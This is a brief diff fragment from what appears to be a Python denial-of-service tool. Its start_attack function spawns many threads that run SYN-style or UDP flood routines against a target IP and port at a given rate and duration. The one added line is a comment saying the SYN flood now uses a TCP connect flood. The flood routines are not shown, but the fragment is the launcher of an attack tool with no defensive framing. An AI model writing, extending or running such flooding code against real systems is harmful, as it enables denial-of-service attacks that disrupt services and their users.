@@ -47,6 +47,7 @@ def start_attack():
     attack_threads = []
     for i in range(clients):
         if attack_type == 'syn':
+            # NOTE: This now calls our "TCP connect flood" version of syn_flood
             t = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration, rate))
         elif attack_type == 'udp':
             t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, rate))
